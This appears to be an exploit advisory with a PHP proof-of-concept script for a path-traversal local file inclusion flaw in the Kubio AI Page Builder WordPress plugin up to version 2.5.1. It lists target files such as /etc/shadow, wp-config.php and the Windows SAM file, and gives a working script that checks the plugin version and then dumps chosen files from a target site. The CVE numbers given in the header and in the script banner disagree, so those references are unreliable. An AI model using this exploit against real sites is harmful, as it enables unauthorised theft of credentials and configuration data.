@@ -1,0 +1,140 @@
+=============================================================================================================================================
+| # Title     : Kubio AI Page Builder 2.5.1 PHP LFI Extractor Scanner                                                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://downloads.wordpress.org/plugin/kubio.2.5.1.zip                                                                      |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/190227/ & 	CVE-2025-30208
+
+[+] Summary 
+
+A Local File Inclusion vulnerability exists in the function
+`kubio_hybrid_theme_load_template` of the Kubio AI Page Builder plugin
+for WordPress (versions ≤ 2.5.1). An unauthenticated attacker may include
+arbitrary files via path traversal. This may lead to sensitive file
+disclosure and can result in remote code execution when chained with
+uploads.
+
+[+] Impact:
+-------
+- Read arbitrary files
+- Information disclosure
+- Possible RCE chained with uploads
+
+[+] Run 
+
+    using: php poc.php https://target.com ../../../../../../etc/passwd
+
+[+] Payload Variants
+
+Linux Sensitive Files
+
+/etc/passwd
+/etc/shadow
+/var/www/html/wp-config.php
+/proc/self/environ
+
+Windows Sensitive Files
+
+C:\Windows\win.ini
+C:\Windows\repair\SAM
+C:\xampp\apache\logs\error.log
+
+WP Sensitive Files
+
+../../../../../../wp-config.php
+../../../../../../wp-admin/admin.php
+
+[+] poc
+
+
+<?php
+/*
+ * Kubio AI Page Builder <= 2.5.1 - Local File Inclusion (LFI)
+ * PHP Scanner
+ * By: Indoushka
+ */
+
+error_reporting(E_ALL);
+set_time_limit(0);
+
+function http_get($url) {
+    $ctx = stream_context_create([
+        'http' => [
+            'timeout' => 10,
+            'method'  => "GET",
+            'header'  => "User-Agent: Indoushka-Scanner/1.0\r\n"
+        ]
+    ]);
+    return @file_get_contents($url, false, $ctx);
+}
+
+function parse_version($version) {
+    $p = explode('.', $version);
+    while (count($p) < 3) $p[] = 0;
+    return array_map('intval', array_slice($p, 0, 3));
+}
+
+function check_plugin_version($target) {
+    $readme = rtrim($target, "/") . "/wp-content/plugins/kubio/readme.txt";
+    $res = http_get($readme);
+
+    if (!$res) return [false, "Cannot fetch readme.txt"];
+
+    if (preg_match('/Stable tag:\s*([\d\.]+)/i', $res, $m)) {
+        $ver = trim($m[1]);
+        $parsed = parse_version($ver);
+        return [$parsed <= [2,5,1], $ver];
+    }
+    return [false, "Version not found"];
+}
+
+function exploit($url, $file) {
+    $exploit = rtrim($url, "/") .
+        "/?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template=" .
+        urlencode($file);
+
+    return http_get($exploit);
+}
+
+function banner() {
+    echo "\n=== Kubio AI Page Builder LFI PHP Scanner ===\n";
+    echo "     CVE-2025-2294\n";
+    echo "     By Indoushka\n\n";
+}
+
+banner();
+
+if ($argc < 2) {
+    echo "Usage:\n";
+    echo "php kubio_lfi.php <url> [file]\n\n";
+    echo "Example:\nphp kubio_lfi.php https://victim.com ../../../../../../etc/passwd\n";
+    exit;
+}
+
+$target = $argv[1];
+$file   = $argv[2] ?? "../../../../../../etc/passwd";
+
+list($vuln, $ver) = check_plugin_version($target);
+
+if ($vuln) {
+    echo "[+] Vulnerable version detected: $ver\n";
+    echo "[+] Exploiting...\n";
+
+    $content = exploit($target, $file);
+    if ($content) {
+        echo "\n===== FILE CONTENT START =====\n";
+        echo $content;
+        echo "\n===== FILE CONTENT END =====\n";
+    } else {
+        echo "[-] Exploit failed or no output.\n";
+    }
+} else {
+    echo "[-] Not vulnerable: $ver\n";
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
